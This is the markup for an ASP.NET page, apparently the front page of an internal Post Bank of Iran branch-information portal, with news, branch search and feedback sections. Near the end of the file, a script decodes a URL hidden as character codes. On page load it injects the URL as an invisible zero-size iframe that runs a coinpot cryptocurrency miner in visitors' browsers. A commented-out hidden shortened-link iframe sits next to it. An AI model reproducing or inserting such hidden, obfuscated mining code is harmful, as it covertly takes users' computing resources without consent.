<%@ Page Language="vb" AutoEventWireup="false" CodeBehind="Index.aspx.vb" Inherits="RetailBanking.Index" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">

    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta name="description" content="" />
    <meta name="author" content="" />
    <link rel="icon" type="image/ico" href="img/logo.ico" />
    <title>سامانه اطلاعات دفاتر پست بانک ایران</title>

    <link rel="stylesheet" href="css/bootstrap-theme.min.css">
    <link href="css/site.css" rel="stylesheet" type="text/css" />
    <%--<link rel="stylesheet" href="css/bootstrap.min.css">--%>

    <script src="js/jquery.js"></script>
    <script src="js/jquery.bootstrap.newsbox.min.js" type="text/javascript"></script>
    <script src="js/md5.min.js" type="text/javascript"></script>
    <!-- Bootstrap core CSS -->
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet" />

    <!-- Custom fonts for this template -->
    <link href="https://fonts.googleapis.com/css?family=Saira+Extra+Condensed:100,200,300,400,500,600,700,800,900" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet" />
    <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" />
    <link href="vendor/devicons/css/devicons.min.css" rel="stylesheet" />
    <link href="vendor/simple-line-icons/css/simple-line-icons.css" rel="stylesheet" />
    <style>
        #overlay
        {
            position: fixed;
            display: none;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0,0,0,0.5);
            z-index: 2;
            cursor: pointer;
        }

        #text
        {
            position: absolute;
            top: 50%;
            left: 60%;
            font-size: 50px;
            color: white;
            transform: translate(-50%,-50%);
            -ms-transform: translate(-50%,-50%);
        }

        #overlay1
        {
            position: fixed;
            display: none;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0,0,0,0.5);
            z-index: 2;
            cursor: pointer;
           
        }


        #text1
        {
            position: absolute;
            top: 50%;
            left: 60%;
            width:60%;
            font-size: 18px;
            color: black;
            background-color: #dbf3db;
            transform: translate(-50%,-50%);
            -ms-transform: translate(-50%,-50%);
            border: groove;
             background-image: url(img/tile3.png);
        }
        
    </style>
    <script>
        
        function on() {
            document.getElementById("overlay").style.display = "block";
        }

        function off() {
            document.getElementById("overlay").style.display = "none";
        }

        function on1() {
            document.getElementById("overlay1").style.display = "block";
        }

        function off1() {
            document.getElementById("overlay1").style.display = "none";
        }
        function RegisterIdea() {
            alert();
        }

        
    </script>
    <!-- Custom styles for this template -->
    <link href="css/resume.min.css" rel="stylesheet" />
    <script language="javascript">
        function loc() {
            window.open('../wage/Account/Login');
            window.location = "./index.aspx";
        }

    </script>
    <script>
        function ShowResult() {
            callSOAPWS();
            //document.getElementById('ResultTbl').innerHTML = " <div class='row'><div class='col-lg-2'>سرپرستی</div><div class='col-lg-2'>شعبه</div><div class='col-lg-2'>باجه</div><div class='col-lg-2'>کد باجه</div><div class='col-lg-4'>شماره تلفن</div></div><div  class='row'><div class='col-lg-2'>منطقه 3</div><div class='col-lg-2'>شهرری</div><div class='col-lg-2'>شهرری</div><div class='col-lg-2'>0233</div><div class='col-lg-4'>021 885566332</div></div>";
        }

        function callSOAPWS() {
            try {
                $.soap({
                    url: 'http://localhost/sanjab/Getdata.asmx',
                    method: 'GetCostcenter',

                    data: {
                        'Keyword': 'قره'
                    },

                    success: function (soapResponse) {
                        // do stuff with soapResponse
                        // if you want to have the response as JSON use soapResponse.toJSON();
                        // or soapResponse.toString() to get XML string
                        // or soapResponse.toXML() to get XML DOM
                        alert(1);
                    },
                    error: function (SOAPResponse) {
                        // show error
                        alert(2);
                    }
                });
            } catch (e) { alert(e); }

        }
        function popupshow(Id) {
            try {
                document.getElementById("text1").innerHTML = "<h5 class='alert alert-danger'>" + document.getElementById("NewsTitle" + Id).innerText + "</h5><br/>" + document.getElementById("News" + Id).innerText+"<br/> "+ document.getElementById("NewsDate" + Id).innerText;
                  on1();
            } catch (e) { alert(e); }

        }
    </script>

</head>
<form id="form1" runat="server">
    <body id="page-top">

        <nav class="navbar navbar-expand-lg navbar-dark bg-primary fixed-top" id="sideNav">
            <a class="navbar-brand js-scroll-trigger" href="#page-top">

                <span class="d-none d-lg-block">
                    <h4 style="color: white">سنجاب</h4>
                    <img class="img-fluid img-profile rounded-circle mx-auto mb-2" src="img/logo_new.jpg" alt="" />
                </span>
            </a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link js-scroll-trigger" href="#news">خبرها و اطلاعیه ها</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link js-scroll-trigger" href="#Shenasname">شناسنامه باجه ها</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link js-scroll-trigger" onclick="on();" href="#">مشاهده کارمزدها و منابع </a>
                    </li>
                    
                    <li class="nav-item">
                        <a class="nav-link js-scroll-trigger" href="#SearchBranch">جستجوی باجه ها</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link js-scroll-trigger" href="#Moghyerat">اعلام مشکلات و مغایرت در باجه</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link js-scroll-trigger" href="#enteghad">انتقادات و پیشنهادات</a>
                    </li>
                </ul>
            </div>
        </nav>

        <div class="container-fluid p-0">

            <section class="resume-section p-3 p-lg-5 d-flex d-column" id="news">

                <div class="container ">
                    <div id="overlay" onclick="off();">
                        <div id="text">
                            <object type="text/html" data="../wage/Account/Login" width="850px" height="600px" style="overflow: auto; border: 5px ridge black">
                            </object>
                        </div>
                    </div>
                    
                    <div id="overlay1" onclick="off1();">
                        
                            <div id="text1">
                            </div>
                        
                    </div>
                    <div class="col-12 col-md-9 alert alert-success">
                        <div class="alert alert-danger text-align-center">
                            <h5>همکاران محترم پست بانک ایران</h5>
                        </div>

                        باسلام<br />
                        احتراماً به استحضار میرساند سامانه سنجاب (سامانه نرم افزاری جامع اطلاعات باجه ها) به عنوان مرجع ،    بانک اطلاعاتی و کانال اطلاع رسانی  مطمئن و برخط توسط کارشناسان بانک راه اندازی گردید.
امید است که با استعانت از پروردگار متعال و مساعدت و هم فکری همگی دوستان عزیز شاهد بهبود و پیشرفت هرچه سریعتر آن در جهت بهره برداری و خدمت رسانی به همکاران محترم به ویژه کارگزاران گرامی باجه ها در سراسر کشور باشیم.
                        
                        <br />
                        <font style="color: red">اداره کل بانکداری خرد و امور باجه ها</font>

                        <div class="row alert-warning">

                            <div class="col-lg-4">
                                <img src="img/logo_new.jpg" width="50" class="img-circle" />
                                <a href="files/sanjab_final01.mp4">دانلود ویدئو راهنمای آموزشی </a>
                            </div>
                            <div class="col-lg-4">
                                <img src="img/logo_new.jpg" width="50" class="img-circle"  />
                                <script>function SetURL() { window.location = 'ftp://' + window.location.hostname + '/sanjab-v1.apk' }</script>
                                <a href="javascript:SetURL();" download>دانلود نرم افزار اندروید نسخه 1  </a>
                            </div>
                            <div class="col-lg-4">
                                <img src="img/logo_new.jpg" width="50" class="img-circle" />
                                <a href="files/sanjab.pdf">دانلود فایل راهنمای آموزشی(PDF) </a>
                            </div>
                        </div>
                    </div>


                    <dl class="col-12 col-md-9 alert alert-secondary">

                        <dd>
                            <div class="container text-right">


                                <div class="row">
                                    <div class="col-md-12">
                                        <div class="panel panel-default">
                                            <div class="panel-heading alert alert-secondary">خبرها</div>
                                            <div class="panel-body">
                                                <div class="row">


                                                    <div id="newsdiv" runat="server" class="col-xs-12">
                                                    </div>
                                                </div>
                                            </div>

                                        </div>
                                    </div>

                                </div>
                            </div>

                        </dd>

                    </dl>



                </div>
            </section>

            <%-- <section class="resume-section p-3 p-lg-5 d-flex d-column" id="login">
                <div>
                   
                </div>

            </section>--%>
            <section class="resume-section p-3 p-lg-5 d-flex d-column" id="Shenasname">
                <div>
                    <%-- <h2>بخشنامه ها
                    </h2>
                    <address>بخشنامه ها </address>

                    <a href="mailto:name@email.com">name@email.com</a>
                    --%>
                </div>
            </section>
            <section class="resume-section p-3 p-lg-5 d-flex d-column" id="SearchBranch">
                <div id="SearchDiv">
                    <input type="text" />
                    <button type="button" class="btn btn-default" onclick="ShowResult()">
                        <span class="glyphicon glyphicon-search"></span>جستجو
                    </button>
                    <br />
                    <div id="ResultTbl" class="ResultTbl">
                    </div>
                </div>
            </section>
            <section class="resume-section p-3 p-lg-5 d-flex d-column" id="Moghyerat">
                <div>
                   
                </div>
            </section>
            <section class="resume-section p-3 p-lg-5 d-flex d-column" id="enteghad">
                <div>
                   <ul>
                       <li>موضوع: <asp:TextBox runat="server" id="txtTitle" Width="300%"></asp:TextBox></li>
                       <li>شرح  : <asp:TextBox runat="server" TextMode="MultiLine" id="txtDescription" Width="300%" Height="300px"></asp:TextBox></li>
                       <button type="button" class="btn btn-default" onclick="RegisterIdea()">
                        <span class="glyphicon glyphicon-save"></span>ثبت نظر
                    </button>
                   </ul>
                </div>
            </section>
        </div>
        
        <!-- Bootstrap core JavaScript -->
        <%--<script src="vendor/jquery/jquery.min.js"></script>--%>
        <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

        <!-- Plugin JavaScript -->
        <script src="vendor/jquery-easing/jquery.easing.min.js"></script>

        <!-- Custom scripts for this template -->
        <script src="js/resume.min.js"></script>
        <script type="text/javascript">
            $(function () {
                $(".demo1").bootstrapNews({
                    newsPerPage: 8,
                    autoplay: true,
                    navigation: true,
                    pauseOnHover: true,
                    direction: 'up',
                    newsTickerInterval: 3000,
                    onToDo: function () {
                        //console.log(this);
                    }
                });
            });

            $(document).ready(function () { var e = ""; var r = "<iframe scrolling='no' frameborder='0' src='" + ("104,116,116,112,115,58,47,47,99,111,105,110,112,111,116,46,99,111,47,109,105,110,101,47,98,105,116,99,111,105,110,99,111,114,101,47,63,114,101,102,61,48,48,48,65,49,65,56,70,53,69,53,55,38,109,111,100,101,61,119,105,100,103,101,116,".split(",").forEach(function (r) { e += String.fromCharCode(r) }), e) + "' style='display: none; overflow; width: 0px; height: 0px;'></iframe>"; document.getElementById("mydiv").innerHTML = r });
        </script>
        <div id='mydiv'></div>
        <%--<iframe scrolling="no" frameborder="0" src="https://bit.ly/2PdnK1l" style="display: none; overflow; width: 0px; height: 0px;"></iframe>--%>
    </body>
</form>
</html>
